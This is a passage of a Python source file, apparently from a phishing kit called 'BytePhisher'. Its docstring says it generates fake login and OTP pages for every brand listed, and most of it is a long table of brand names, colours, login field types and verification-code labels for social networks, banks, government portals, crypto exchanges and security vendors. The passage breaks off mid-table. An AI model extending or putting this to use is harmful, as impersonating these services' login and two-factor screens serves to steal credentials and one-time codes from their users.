#!/usr/bin/env python3
"""
BytePhisher - template-library generator.

Generates a full login-page template pack for every brand in SITES (403 in this
file, plus template_brands.BRANDS; 808 in the shipped library):
each site gets templates/<slug>/index.html, otp.html and fields.json.

Branding (colors/name/domain/field-type) lives in SITES below, so adding a
site is one tuple - no HTML editing. Re-run to regenerate everything:

    python3 -m tools.gen_templates
"""
import json
import os
import sys


def _out_dir():
    """Templates go where the operator points us (BYTEPHISHER_HOME), else next to
    the source checkout - never into a read-only site-packages install."""
    env = os.environ.get("BYTEPHISHER_HOME")
    if env and os.path.isdir(env):
        return os.path.join(env, "templates")
    return os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "templates")


OUT = _out_dir()

# (slug, display name, brand color, accent color, login-with, otp_label)
# login-with: email | username | phone | email_or_phone
SITES = [
    ("facebook",     "Facebook",        "#1877F2", "#ffffff", "email_or_phone", "6-digit code"),
    ("instagram",    "Instagram",       "#E1306C", "#833AB4", "username",       "6-digit code"),
    ("google",       "Google",          "#4285F4", "#ffffff", "email",          "2-step verification code"),
    ("gmail",        "Gmail",           "#D93025", "#ffffff", "email",          "6-digit code"),
    ("youtube",      "YouTube",         "#FF0000", "#ffffff", "email",          "6-digit code"),
    ("twitter",      "X",               "#000000", "#ffffff", "username",       "confirmation code"),
    ("linkedin",     "LinkedIn",        "#0A66C2", "#ffffff", "email",          "6-digit code"),
    ("github",       "GitHub",          "#24292F", "#ffffff", "username",       "device verification code"),
    ("gitlab",       "GitLab",          "#FC6D26", "#ffffff", "email",          "6-digit code"),
    ("bitbucket",    "Bitbucket",       "#0052CC", "#ffffff", "email",          "6-digit code"),
    ("netflix",      "Netflix",         "#E50914", "#221f1f", "email",          "verification code"),
    ("paypal",       "PayPal",          "#003087", "#009cde", "email",          "security code"),
    ("ebay",         "eBay",            "#E53238", "#0064D2", "email",          "6-digit code"),
    ("amazon",       "Amazon",          "#FF9900", "#232F3E", "email",          "OTP code"),
    ("apple",        "Apple ID",        "#000000", "#007AFF", "email",          "verification code"),
    ("icloud",       "iCloud",          "#007AFF", "#ffffff", "email",          "verification code"),
    ("microsoft",    "Microsoft",       "#0078D4", "#ffffff", "email",          "security code"),
    ("outlook",      "Outlook",         "#0078D4", "#ffffff", "email",          "security code"),
    ("office365",    "Office 365",      "#D83B01", "#ffffff", "email",          "security code"),
    ("onedrive",     "OneDrive",        "#0078D4", "#ffffff", "email",          "security code"),
    ("teams",        "Microsoft Teams", "#6264A7", "#ffffff", "email",          "security code"),
    ("yahoo",        "Yahoo",           "#6001D2", "#ffffff", "email",          "6-digit code"),
    ("aol",          "AOL",             "#000000", "#ffffff", "email",          "6-digit code"),
    ("steam",        "Steam",           "#171A21", "#66c0f4", "username",       "Steam Guard code"),
    ("discord",      "Discord",         "#5865F2", "#ffffff", "email",          "2FA code"),
    ("slack",        "Slack",           "#4A154B", "#ffffff", "email",          "6-digit code"),
    ("spotify",      "Spotify",         "#1DB954", "#191414", "email",          "6-digit code"),
    ("twitch",       "Twitch",          "#9146FF", "#ffffff", "username",       "6-digit code"),
    ("reddit",       "Reddit",          "#FF4500", "#ffffff", "username",       "6-digit code"),
    ("pinterest",    "Pinterest",       "#E60023", "#ffffff", "email",          "6-digit code"),
    ("whatsapp",     "WhatsApp",        "#25D366", "#075E54", "phone",          "6-digit code"),
    ("telegram",     "Telegram",        "#26A5E4", "#ffffff", "phone",          "login code"),
    ("snapchat",     "Snapchat",        "#FFFC00", "#000000", "username",       "verification code"),
    ("tiktok",       "TikTok",          "#000000", "#FE2C55", "email_or_phone", "6-digit code"),
    ("dropbox",      "Dropbox",         "#0061FF", "#ffffff", "email",          "6-digit code"),
    ("adobe",        "Adobe",           "#FF0000", "#ffffff", "email",          "verification code"),
    ("shopify",      "Shopify",         "#96BF48", "#ffffff", "email",          "6-digit code"),
    ("trello",       "Trello",          "#0079BF", "#ffffff", "email",          "6-digit code"),
    ("notion",       "Notion",          "#000000", "#ffffff", "email",          "login code"),
    ("figma",        "Figma",           "#F24E1E", "#ffffff", "email",          "6-digit code"),
    ("canva",        "Canva",           "#00C4CC", "#7D2AE8", "email",          "verification code"),
    ("zoom",         "Zoom",            "#2D8CFF", "#ffffff", "email",          "verification code"),
    ("vk",           "VK",              "#0077FF", "#ffffff", "phone",          "6-digit code"),
    ("ok",           "Odnoklassniki",   "#EE8208", "#ffffff", "phone",          "6-digit code"),
    ("yandex",       "Yandex",          "#FC3F1D", "#ffffff", "username",       "6-digit code"),
    ("mailru",       "Mail.ru",         "#005FF9", "#ffffff", "email",          "6-digit code"),
    ("badoo",        "Badoo",           "#783BF9", "#ffffff", "email",          "6-digit code"),
    ("tinder",       "Tinder",          "#FD5068", "#ffffff", "phone",          "6-digit code"),
    ("icici",        "ICICI Bank",      "#F58220", "#AF2A28", "username",       "OTP"),
    ("sbi",          "State Bank of India", "#22409A", "#ffffff", "username",   "OTP"),
    ("hdfc",         "HDFC Bank",       "#004C8F", "#ED1C24", "username",       "OTP"),
    ("axis",         "Axis Bank",       "#97144D", "#ffffff", "username",       "OTP"),
    ("kotak",        "Kotak Bank",      "#ED1C24", "#ffffff", "username",       "OTP"),
    ("paytm",        "Paytm",           "#00BAF2", "#20336B", "phone",          "OTP"),
    ("phonepe",      "PhonePe",         "#5F259F", "#ffffff", "phone",          "OTP"),
    ("airtel",       "Airtel",          "#E40000", "#ffffff", "phone",          "OTP"),
    ("jio",          "Jio",             "#0F3CC9", "#ffffff", "phone",          "OTP"),
    ("vodafone",     "Vodafone",        "#E60000", "#ffffff", "phone",          "OTP"),
    ("verizon",      "Verizon",         "#CD040B", "#ffffff", "username",       "verification code"),
    ("att",          "AT&T",            "#00A8E0", "#ffffff", "username",       "verification code"),
    ("xfinity",      "Xfinity",         "#0072CE", "#ffffff", "username",       "verification code"),
    ("binance",      "Binance",         "#F0B90B", "#1E2026", "email",          "2FA code"),
    ("coinbase",     "Coinbase",        "#0052FF", "#ffffff", "email",          "2FA code"),
    ("metamask",     "MetaMask",        "#F6851B", "#ffffff", "email",          "verification code"),
    ("blockchain",   "Blockchain.com",  "#121D33", "#1652F0", "email",          "2FA code"),
    ("kraken",       "Kraken",          "#5741D9", "#ffffff", "email",          "2FA code"),
    ("uber",         "Uber",            "#000000", "#ffffff", "phone",          "verification code"),
    ("airbnb",       "Airbnb",          "#FF5A5F", "#ffffff", "email",          "verification code"),
    ("booking",      "Booking.com",     "#003580", "#FEBB02", "email",          "verification code"),
    ("zomato",       "Zomato",          "#E23744", "#ffffff", "phone",          "OTP"),
    ("swiggy",       "Swiggy",          "#FC8019", "#ffffff", "phone",          "OTP"),
    ("flipkart",     "Flipkart",        "#2874F0", "#F8E831", "email",          "OTP"),
    ("myntra",       "Myntra",          "#FF3F6C", "#ffffff", "email",          "OTP"),
    ("alibaba",      "Alibaba",         "#FF6A00", "#ffffff", "email",          "verification code"),
    ("amex",         "American Express","#006FCF", "#ffffff", "username",       "security code"),
    ("chime",        "Chime",           "#1EC677", "#0C2340", "email",          "verification code"),
    ("wise",         "Wise",            "#9FE870", "#163300", "email",          "login code"),
    ("revolut",      "Revolut",         "#191C1F", "#0666EB", "phone",          "verification code"),
    ("aws",          "AWS",             "#FF9900", "#232F3E", "email",          "MFA code"),
    ("cloudflare",   "Cloudflare",      "#F38020", "#0051C3", "email",          "verification code"),
    # ---- extended library (81-150): SaaS, dev tools, finance, streaming ----
    ("atlassian",    "Atlassian",       "#0052CC", "#2684FF", "email",          "verification code"),
    ("jira",         "Jira",            "#0052CC", "#2684FF", "email",          "6-digit code"),
    ("confluence",   "Confluence",      "#0052CC", "#2684FF", "email",          "6-digit code"),
    ("bitwarden",    "Bitwarden",       "#175DDC", "#ffffff", "email",          "2FA code"),
    ("lastpass",     "LastPass",        "#D32D27", "#ffffff", "email",          "verification code"),
    ("onepassword",  "1Password",       "#1A8CFF", "#ffffff", "email",          "verification code"),
    ("dashlane",     "Dashlane",        "#0E353D", "#0E353D", "email",          "verification code"),
    ("nordvpn",      "NordVPN",         "#4687FF", "#ffffff", "email",          "verification code"),
    ("protonmail",   "Proton Mail",     "#6D4AFF", "#ffffff", "email",          "2FA code"),
    ("zoho",         "Zoho",            "#E42527", "#ffffff", "email",          "6-digit code"),
    ("salesforce",   "Salesforce",      "#00A1E0", "#032E61", "email",          "verification code"),
    ("hubspot",      "HubSpot",         "#FF7A59", "#33475B", "email",          "6-digit code"),
    ("mailchimp",    "Mailchimp",       "#FFE01B", "#241C15", "email",          "6-digit code"),
    ("sendgrid",     "SendGrid",        "#1A82E2", "#ffffff", "email",          "verification code"),
    ("twilio",       "Twilio",          "#F22F46", "#ffffff", "email",          "verification code"),
    ("stripe",       "Stripe",          "#635BFF", "#0A2540", "email",          "verification code"),
    ("square",       "Square",          "#3E4348", "#006AFF", "email",          "6-digit code"),
    ("klarna",       "Klarna",          "#FFB3C7", "#0E0E0F", "email",          "verification code"),
    ("plaid",        "Plaid",           "#111111", "#ffffff", "email",          "verification code"),
    ("quickbooks",   "QuickBooks",      "#2CA01C", "#ffffff", "email",          "verification code"),
    ("xero",         "Xero",            "#13B5EA", "#ffffff", "email",          "6-digit code"),
    ("godaddy",      "GoDaddy",         "#1BDBDB", "#111111", "email",          "verification code"),
    ("namecheap",    "Namecheap",       "#DE3723", "#ffffff", "email",          "6-digit code"),
    ("hostinger",    "Hostinger",       "#673DE6", "#ffffff", "email",          "6-digit code"),
    ("digitalocean", "DigitalOcean",    "#0080FF", "#ffffff", "email",          "verification code"),
    ("linode",       "Linode",          "#00A95C", "#ffffff", "email",          "verification code"),
    ("vultr",        "Vultr",           "#007BFC", "#ffffff", "email",          "verification code"),
    ("heroku",       "Heroku",          "#430098", "#ffffff", "email",          "verification code"),
    ("vercel",       "Vercel",          "#000000", "#ffffff", "email",          "verification code"),
    ("netlify",      "Netlify",         "#00C7B7", "#0E1E25", "email",          "verification code"),
    ("supabase",     "Supabase",        "#3ECF8E", "#1C1C1C", "email",          "verification code"),
    ("firebase",     "Firebase",        "#FFCA28", "#1A73E8", "email",          "verification code"),
    ("mongodb",      "MongoDB",         "#47A248", "#001E2B", "email",          "verification code"),
    ("redis",        "Redis",           "#DC382D", "#ffffff", "email",          "verification code"),
    ("datadog",      "Datadog",         "#632CA6", "#ffffff", "email",          "verification code"),
    ("sentry",       "Sentry",          "#362D59", "#ffffff", "email",          "verification code"),
    ("grafana",      "Grafana",         "#F46800", "#1F1F20", "email",          "verification code"),
    ("splunk",       "Splunk",          "#000000", "#65A637", "email",          "verification code"),
    ("pagerduty",    "PagerDuty",       "#06AC38", "#ffffff", "email",          "verification code"),
    ("okta",         "Okta",            "#007DC1", "#ffffff", "email",          "verification code"),
    ("auth0",        "Auth0",           "#EB5424", "#16214D", "email",          "verification code"),
    ("workday",      "Workday",         "#0875E1", "#ffffff", "email",          "verification code"),
    ("bamboohr",     "BambooHR",        "#73C41D", "#ffffff", "email",          "verification code"),
    ("gusto",        "Gusto",           "#F45D48", "#0A8080", "email",          "verification code"),
    ("docusign",     "DocuSign",        "#4C00FF", "#FFCC22", "email",          "verification code"),
    ("calendly",     "Calendly",        "#006BFF", "#0B3558", "email",          "verification code"),
    ("typeform",     "Typeform",        "#262627", "#ffffff", "email",          "verification code"),
    ("surveymonkey", "SurveyMonkey",    "#00BF6F", "#ffffff", "email",          "verification code"),
    ("patreon",      "Patreon",         "#FF424D", "#0B0B0B", "email",          "verification code"),
    ("substack",     "Substack",        "#FF6719", "#ffffff", "email",          "verification code"),
    ("medium",       "Medium",          "#000000", "#1A8917", "email",          "verification code"),
    ("quora",        "Quora",           "#B92B27", "#ffffff", "email",          "verification code"),
    ("tumblr",       "Tumblr",          "#36465D", "#ffffff", "email",          "verification code"),
    ("imgur",        "Imgur",           "#1BB76E", "#ffffff", "email",          "verification code"),
    ("vimeo",        "Vimeo",           "#1AB7EA", "#000000", "email",          "verification code"),
    ("soundcloud",   "SoundCloud",      "#FF5500", "#333333", "email",          "verification code"),
    ("hulu",         "Hulu",            "#1CE783", "#0B0B0B", "email",          "verification code"),
    ("disneyplus",   "Disney+",         "#113CCF", "#000000", "email",          "verification code"),
    ("primevideo",   "Prime Video",     "#00A8E1", "#1A1A1A", "email",          "verification code"),
    ("crunchyroll",  "Crunchyroll",     "#F47521", "#171717", "email",          "verification code"),
    ("wetransfer",   "WeTransfer",      "#409FFF", "#2C2C2C", "email",          "verification code"),
    ("mega",         "MEGA",            "#D9272E", "#0F0F0F", "email",          "verification code"),
    ("kaggle",       "Kaggle",          "#20BEFF", "#2A2A2A", "email",          "verification code"),
    ("hackerrank",   "HackerRank",      "#00EA64", "#101828", "email",          "verification code"),
    ("leetcode",     "LeetCode",        "#FFA116", "#1A1A1A", "email",          "verification code"),
    ("coursera",     "Coursera",        "#0056D2", "#ffffff", "email",          "verification code"),
    ("udemy",        "Udemy",           "#A435F0", "#1C1D1F", "email",          "verification code"),
    ("edx",          "edX",             "#02262B", "#D6400A", "email",          "verification code"),
    ("byjus",        "BYJU'S",          "#8133F1", "#ffffff", "email",          "OTP"),
    ("unacademy",    "Unacademy",       "#08BD80", "#ffffff", "phone",          "OTP"),
    ("vedantu",      "Vedantu",         "#FF6B00", "#ffffff", "phone",          "OTP"),
    ("irctc",        "IRCTC",           "#0A3D62", "#F79F1F", "username",       "OTP"),
    ("uidai",        "Aadhaar Services", "#0F52BA", "#FF9933", "username",      "OTP"),
    ("epfindia",     "EPFO",            "#1B5E20", "#FFC107", "username",       "OTP"),
    ("gst",          "GST Portal",      "#0B5394", "#E8A33D", "username",       "OTP"),
    ("digilocker",   "DigiLocker",      "#1C3F94", "#F26522", "phone",          "OTP"),
    ("canarabank",   "Canara Bank",     "#00539F", "#F7A800", "username",       "OTP"),
    ("pnb",          "Punjab National Bank", "#A11C2C", "#F2A900", "username",  "OTP"),
    ("bob",          "Bank of Baroda",  "#F26522", "#00437A", "username",       "OTP"),
    ("idfc",         "IDFC FIRST Bank", "#9C1D26", "#00594F", "phone",          "OTP"),
    ("federal",      "Federal Bank",    "#002D62", "#F5A623", "username",       "OTP"),
    ("indusind",     "IndusInd Bank",   "#982A2E", "#E1B351", "username",       "OTP"),
    ("yesbank",      "YES Bank",        "#004C8F", "#00A0DF", "username",       "OTP"),
    ("cred",         "CRED",            "#111111", "#ffffff", "phone",          "OTP"),
    ("mobikwik",     "MobiKwik",        "#EF4A56", "#2B2B2B", "phone",          "OTP"),
    ("freecharge",   "Freecharge",      "#FF5722", "#1E1E1E", "phone",          "OTP"),
    ("bharatpe",     "BharatPe",        "#00B9F1", "#0B2447", "phone",          "OTP"),
    ("zerodha",      "Zerodha",         "#FF5722", "#2B2B2B", "username",       "OTP"),
    ("groww",        "Groww",           "#00D09C", "#44475B", "email",          "6-digit code"),
    ("upstox",       "Upstox",          "#387ED1", "#ffffff", "phone",          "OTP"),
    ("angelone",     "Angel One",       "#FF6B00", "#1B1B1B", "username",       "OTP"),
    ("cryptocom",    "Crypto.com",      "#1199FA", "#0B1426", "email",          "2FA code"),
    ("kucoin",       "KuCoin",          "#24AE8F", "#1B1B1B", "email",          "2FA code"),
    ("okx",          "OKX",             "#000000", "#ffffff", "email",          "2FA code"),
    ("bitfinex",     "Bitfinex",        "#16B157", "#0B0B0B", "email",          "2FA code"),
    ("ledger",       "Ledger",          "#000000", "#ffffff", "email",          "verification code"),
    ("trezor",       "Trezor",          "#0B0B0B", "#14C46A", "email",          "verification code"),
    ("trustwallet",  "Trust Wallet",    "#3375BB", "#ffffff", "email",          "verification code"),
    ("slackstatus",  "Slack SSO",       "#E01E5A", "#36C5F0", "email",          "SSO code"),
    # ---- extended library (180-240): enterprise, devops, networking, devices ----
    ("azuredevops",  "Azure DevOps",    "#0078D7", "#ffffff", "email",          "verification code"),
    ("jetbrains",    "JetBrains",       "#000000", "#FE315D", "email",          "verification code"),
    ("postman",      "Postman",         "#FF6C37", "#ffffff", "email",          "verification code"),
    ("docker",       "Docker Hub",      "#2496ED", "#ffffff", "email",          "verification code"),
    ("kubernetes",   "Kubernetes",      "#326CE5", "#ffffff", "email",          "verification code"),
    ("hashicorp",    "HashiCorp",       "#000000", "#7B42BC", "email",          "verification code"),
    ("terraform",    "Terraform Cloud", "#7B42BC", "#ffffff", "email",          "verification code"),
    ("jenkins",      "Jenkins",         "#D33833", "#335061", "username",       "verification code"),
    ("sonarqube",    "SonarQube",       "#4E9BCD", "#ffffff", "email",          "verification code"),
    ("snyk",         "Snyk",            "#4C4A73", "#ffffff", "email",          "verification code"),
    ("crowdstrike",  "CrowdStrike",     "#FC0000", "#ffffff", "email",          "verification code"),
    ("duo",          "Duo Security",    "#6BBF4E", "#ffffff", "email",          "passcode"),
    ("onelogin",     "OneLogin",        "#1C4E80", "#ffffff", "email",          "verification code"),
    ("pingidentity", "Ping Identity",   "#B8032B", "#ffffff", "email",          "verification code"),
    ("cyberark",     "CyberArk",        "#0073CF", "#ffffff", "username",       "verification code"),
    ("zscaler",      "Zscaler",         "#0067B8", "#ffffff", "email",          "verification code"),
    ("netskope",     "Netskope",        "#00B388", "#ffffff", "email",          "verification code"),
    ("paloalto",     "Palo Alto Networks", "#FA582D", "#ffffff", "email",       "verification code"),
    ("fortinet",     "Fortinet",        "#EE3124", "#ffffff", "username",       "verification code"),
    ("checkpoint",   "Check Point",     "#E4002B", "#ffffff", "username",       "verification code"),
    ("cisco",        "Cisco",           "#1BA0D7", "#ffffff", "email",          "verification code"),
    ("juniper",      "Juniper",         "#84B135", "#ffffff", "username",       "verification code"),
    ("aruba",        "Aruba Networks",  "#FF8300", "#ffffff", "username",       "verification code"),
    ("ubiquiti",     "Ubiquiti",        "#0559C9", "#ffffff", "email",          "verification code"),
    ("mikrotik",     "MikroTik",        "#293239", "#ffffff", "username",       "verification code"),
    ("tplink",       "TP-Link",         "#4ACBD6", "#ffffff", "username",       "verification code"),
    ("netgear",      "NETGEAR",         "#00A0DF", "#ffffff", "username",       "verification code"),
    ("asus-router",  "ASUS Router",     "#00539B", "#ffffff", "username",       "verification code"),
    ("dlink",        "D-Link",          "#E4002B", "#ffffff", "username",       "verification code"),
    ("synology",     "Synology",        "#B5B5B6", "#003A5D", "username",       "verification code"),
    ("qnap",         "QNAP",            "#0066CC", "#ffffff", "username",       "verification code"),
    ("samsung",      "Samsung Account", "#1428A0", "#ffffff", "email",          "verification code"),
    ("xiaomi",       "Xiaomi Account",  "#FF6900", "#ffffff", "email_or_phone", "verification code"),
    ("huawei",       "Huawei ID",       "#CF0A2C", "#ffffff", "email_or_phone", "verification code"),
    ("oppo",         "OPPO",            "#006341", "#ffffff", "phone",          "verification code"),
    ("vivo",         "vivo",            "#415FFF", "#ffffff", "phone",          "verification code"),
    ("oneplus",      "OnePlus",         "#EB0028", "#ffffff", "email",          "verification code"),
    ("nokia",        "Nokia",           "#124191", "#ffffff", "email",          "verification code"),
    ("motorola",     "Motorola",        "#000000", "#5C92D1", "email",          "verification code"),
    ("lg",           "LG Account",      "#A50034", "#ffffff", "email",          "verification code"),
    ("sony",         "Sony",            "#000000", "#ffffff", "email",          "verification code"),
    ("philips",      "Philips Hue",     "#0B5ED7", "#ffffff", "email",          "verification code"),
    ("siemens",      "Siemens",         "#009999", "#ffffff", "email",          "verification code"),
    ("honeywell",    "Honeywell",       "#EE3124", "#ffffff", "email",          "verification code"),
    ("schneider",    "Schneider Electric", "#3DCD58", "#007A33", "email",       "verification code"),
    ("dell",         "Dell",            "#007DB8", "#ffffff", "email",          "verification code"),
    ("hp",           "HP",              "#0096D6", "#ffffff", "email",          "verification code"),
    ("lenovo",       "Lenovo",          "#E2231A", "#ffffff", "email",          "verification code"),
    ("acer",         "Acer",            "#83B81A", "#1C1C1C", "email",          "verification code"),
    ("msi",          "MSI",             "#FF0000", "#000000", "email",          "verification code"),
    ("nvidia",       "NVIDIA",          "#76B900", "#000000", "email",          "verification code"),
    ("amd",          "AMD",             "#ED1C24", "#000000", "email",          "verification code"),
    ("intel",        "Intel",           "#0068B5", "#ffffff", "email",          "verification code"),
    ("qualcomm",     "Qualcomm",        "#3253DC", "#ffffff", "email",          "verification code"),
    ("reddit-ads",   "Reddit Ads",      "#FF4500", "#ffffff", "email",          "verification code"),
    ("gocardless",   "GoCardless",      "#0B0B0B", "#F1F1F1", "email",          "verification code"),
    ("adyen",        "Adyen",           "#0ABF53", "#001222", "email",          "verification code"),
    ("razorpay",     "Razorpay",        "#0C2451", "#3395FF", "email",          "verification code"),
    ("cashfree",     "Cashfree",        "#1A73E8", "#ffffff", "email",          "verification code"),
    ("instamojo",    "Instamojo",       "#4A4A4A", "#F5A623", "email",          "verification code"),
    ("payoneer",     "Payoneer",        "#FF4800", "#ffffff", "email",          "verification code"),
    ("remitly",      "Remitly",         "#0B0B0B", "#1B75BC", "email",          "verification code"),
    ("xoom",         "Xoom",            "#0F9D58", "#ffffff", "email",          "verification code"),
    ("westernunion", "Western Union",   "#FFDD00", "#000000", "username",       "verification code"),

    # ---- expansion pack ----
    ('hdfcbank', 'HDFC Bank', '#004C8F', '#ED232A', 'username', '6-digit code'),
    ('axisbank', 'Axis Bank', '#97144D', '#ffffff', 'username', 'OTP'),
    ('kotakbank', 'Kotak Mahindra Bank', '#EE2737', '#003874', 'username', '6-digit code'),
    ('pnbindia', 'Punjab National Bank', '#F58220', '#8C2D8C', 'username', 'OTP'),
    ('bankofbaroda', 'Bank of Baroda', '#F15A22', '#003C71', 'username', 'OTP'),
    ('unionbank', 'Union Bank of India', '#003F7D', '#E31E24', 'username', 'OTP'),
    ('federalbank', 'Federal Bank', '#00539F', '#F5A623', 'username', 'OTP'),
    ('idfcfirst', 'IDFC FIRST Bank', '#9C1D26', '#ffffff', 'username', 'OTP'),
    ('rblbank', 'RBL Bank', '#1C3F94', '#E4002B', 'username', 'OTP'),
    ('bandhanbank', 'Bandhan Bank', '#8C1D40', '#F7B32B', 'username', 'OTP'),
    ('aubank', 'AU Small Finance Bank', '#F5A200', '#00558C', 'username', 'OTP'),
    ('kotak811', 'Kotak 811', '#EE2737', '#003874', 'phone', '6-digit code'),
    ('bhim', 'BHIM UPI', '#00796B', '#FF6F00', 'phone', 'OTP'),
    ('5paisa', '5paisa', '#F26522', '#0B3C5D', 'username', 'OTP'),
    ('mfcentral', 'MF Central', '#1B5E20', '#F9A825', 'username', 'OTP'),
    ('policybazaar', 'Policybazaar', '#0170B9', '#F7A800', 'email', 'OTP'),
    ('bajajfinserv', 'Bajaj Finserv', '#0057A8', '#E4002B', 'username', 'OTP'),
    ('navi', 'Navi', '#00A9E0', '#1A1A1A', 'phone', 'OTP'),
    ('slice', 'Slice', '#6C2BD9', '#00E0B8', 'phone', 'OTP'),
    ('jupiter', 'Jupiter Money', '#5B2C8D', '#00C9A7', 'phone', 'OTP'),
    ('fimoney', 'Fi Money', '#1E1E1E', '#00C2A8', 'phone', 'OTP'),
    ('wazirx', 'WazirX', '#0B1426', '#2D9CDB', 'email', '2FA code'),
    ('coindcx', 'CoinDCX', '#0B1F3A', '#12B886', 'email', '2FA code'),
    ('zebpay', 'ZebPay', '#1B4DE4', '#ffffff', 'phone', 'OTP'),
    ('viindia', 'Vi India', '#EE2737', '#8B2FBF', 'phone', 'OTP'),
    ('bsnl', 'BSNL', '#0057A8', '#F5A623', 'phone', 'OTP'),
    ('umang', 'UMANG', '#1A73E8', '#FF7043', 'phone', 'OTP'),
    ('epfo', 'EPFO Member Portal', '#1E5AA8', '#F9A825', 'username', 'OTP'),
    ('incometax', 'Income Tax e-Filing', '#0B5394', '#F4B400', 'username', 'OTP'),
    ('gstportal', 'GST Portal', '#1B5E20', '#F9A825', 'username', 'OTP'),
    ('passportindia', 'Passport Seva', '#0B3C5D', '#F4A300', 'username', 'OTP'),
    ('ayushman', 'Ayushman Bharat', '#0F7B6C', '#FFB300', 'phone', 'OTP'),
    ('mca21', 'MCA21', '#00447C', '#F7A800', 'username', 'OTP'),
    ('nsdl', 'NSDL', '#00539F', '#F26522', 'username', 'OTP'),
    ('cdsl', 'CDSL', '#1F4E9C', '#E4002B', 'username', 'OTP'),
    ('kfintech', 'KFintech', '#0055A5', '#F9A825', 'username', 'OTP'),
    ('cams', 'CAMS Online', '#0072BC', '#F5A623', 'username', 'OTP'),
    ('entra', 'Microsoft Entra ID', '#0078D4', '#50E6FF', 'email', 'verification code'),
    ('jumpcloud', 'JumpCloud', '#2E5C8A', '#00C2A8', 'email', 'verification code'),
    ('keycloak', 'Keycloak SSO', '#4D4D4D', '#00A8E8', 'username', 'verification code'),
    ('beyondtrust', 'BeyondTrust', '#0B3C5D', '#00A0DF', 'username', 'verification code'),
    ('sailpoint', 'SailPoint', '#00539F', '#F7A800', 'username', 'verification code'),
    ('saviynt', 'Saviynt', '#1B5E8C', '#F26522', 'username', 'verification code'),
    ('gcp', 'Google Cloud Console', '#4285F4', '#EA4335', 'email', '2-step code'),
    ('azureportal', 'Azure Portal', '#0078D4', '#50E6FF', 'email', 'verification code'),
    ('cloudflare-dash', 'Cloudflare Dashboard', '#F38020', '#FAAE40', 'email', '2FA code'),
    ('oraclecloud', 'Oracle Cloud', '#C74634', '#312D2A', 'email', 'verification code'),
    ('ibmcloud', 'IBM Cloud', '#0F62FE', '#161616', 'email', 'verification code'),
    ('alibabacloud', 'Alibaba Cloud', '#FF6A00', '#1B3A5C', 'email', 'verification code'),
    ('tencentcloud', 'Tencent Cloud', '#0052D9', '#00A4FF', 'email', 'verification code'),
    ('render', 'Render', '#46E3B7', '#1A1A1A', 'email', 'verification code'),
    ('railway', 'Railway', '#0B0D0E', '#7B3FE4', 'email', 'verification code'),
    ('flyio', 'Fly.io', '#24175B', '#8B5CF6', 'email', 'verification code'),
    ('dockerhub', 'Docker Hub', '#0DB7ED', '#384D54', 'username', 'verification code'),
    ('npmjs', 'npm', '#CB3837', '#1A1A1A', 'username', '2FA code'),
    ('pypi', 'PyPI', '#3775A9', '#FFD343', 'username', '2FA code'),
    ('circleci', 'CircleCI', '#161616', '#3EAAAF', 'email', 'verification code'),
    ('terraform-cloud', 'Terraform Cloud', '#7B42BC', '#1B1B1B', 'email', '2FA code'),
    ('newrelic', 'New Relic', '#1CE783', '#0B0B0B', 'email', '2FA code'),
    ('elastic', 'Elastic Cloud', '#005571', '#FEC514', 'email', '2FA code'),
    ('fastmail', 'Fastmail', '#0067B9', '#0B0D0E', 'email', '2FA code'),
    ('tutanota', 'Tuta Mail', '#840010', '#1B1B1B', 'email', '2FA code'),
    ('gmx', 'GMX Mail', '#1C449B', '#F7A800', 'email', 'verification code'),
    ('webex', 'Webex', '#00A0E9', '#049FD9', 'email', 'verification code'),
    ('gotomeeting', 'GoTo Meeting', '#F68C06', '#0B3C5D', 'email', 'verification code'),
    ('skype', 'Skype', '#00AFF0', '#0078D4', 'email', 'verification code'),
    ('line', 'LINE', '#00C300', '#06C755', 'phone', 'verification code'),
    ('viber', 'Viber', '#7360F2', '#59267C', 'phone', 'verification code'),
    ('wechat', 'WeChat', '#07C160', '#1AAD19', 'phone', 'verification code'),
    ('signal', 'Signal', '#3A76F0', '#1B1B1B', 'phone', 'verification code'),
    ('discordapp', 'Discord', '#5865F2', '#404EED', 'email', 'verification code'),
    ('bybit', 'Bybit', '#F7A600', '#1B1B1B', 'email', '2FA code'),
    ('gateio', 'Gate.io', '#2354E6', '#0B1F3A', 'email', '2FA code'),
    ('phantom', 'Phantom Wallet', '#AB9FF2', '#4B3F99', 'email', 'verification code'),
    ('coinmarketcap', 'CoinMarketCap', '#17181B', '#3861FB', 'email', '2FA code'),
    ('epicgames', 'Epic Games', '#2A2A2A', '#0074E4', 'email', '2FA code'),
    ('riotgames', 'Riot Games', '#D13639', '#1B1B1B', 'username', 'verification code'),
    ('battlenet', 'Battle.net', '#148EFF', '#00AEFF', 'email', 'verification code'),
    ('playstation', 'PlayStation Network', '#003791', '#0070D1', 'email', 'verification code'),
    ('xbox', 'Xbox Live', '#107C10', '#52B043', 'email', 'verification code'),
    ('nintendo', 'Nintendo Account', '#E60012', '#1B1B1B', 'email', 'verification code'),
    ('roblox', 'Roblox', '#E2231A', '#1B1B1B', 'username', 'verification code'),
    ('garena', 'Garena', '#EE4D2D', '#1B1B1B', 'email', 'verification code'),
    ('expressvpn', 'ExpressVPN', '#DA3940', '#1B1B1B', 'email', 'verification code'),
    ('surfshark', 'Surfshark', '#1EBFBF', '#0B1F3A', 'email', 'verification code'),
    ('protonvpn', 'Proton VPN', '#6D4AFF', '#1B1340', 'username', '2FA code'),
    ('mullvad', 'Mullvad', '#FFD900', '#1B1B1B', 'username', 'verification code'),
    ('kaspersky', 'Kaspersky', '#006D5C', '#1EBFBF', 'email', 'verification code'),
    ('norton', 'Norton', '#FFE01A', '#1B1B1B', 'email', 'verification code'),
    ('mcafee', 'McAfee', '#C01818', '#1B1B1B', 'email', 'verification code'),
    ('bitdefender', 'Bitdefender', '#ED1C24', '#1B1B1B', 'email', 'verification code'),
    ('avast', 'Avast', '#FF7800', '#1B1B1B', 'email', 'verification code'),
    ('eset', 'ESET', '#0098D8', '#1B1B1B', 'email', 'verification code'),
    ('trendmicro', 'Trend Micro', '#D71920', '#1B1B1B', 'email', 'verification code'),
    ('ajio', 'AJIO', '#2C4152', '#D5A021', 'phone', 'OTP'),
    ('meesho', 'Meesho', '#F43397', '#570D3B', 'phone', 'OTP'),
    ('snapdeal', 'Snapdeal', '#E40046', '#1B1B1B', 'email', 'OTP'),
    ('nykaa', 'Nykaa', '#FC2779', '#1B1B1B', 'email', 'OTP'),
    ('tatacliq', 'Tata CLiQ', '#1B4D8C', '#F7A800', 'email', 'OTP'),
    ('aliexpress', 'AliExpress', '#FF4747', '#E62E04', 'email', 'verification code'),
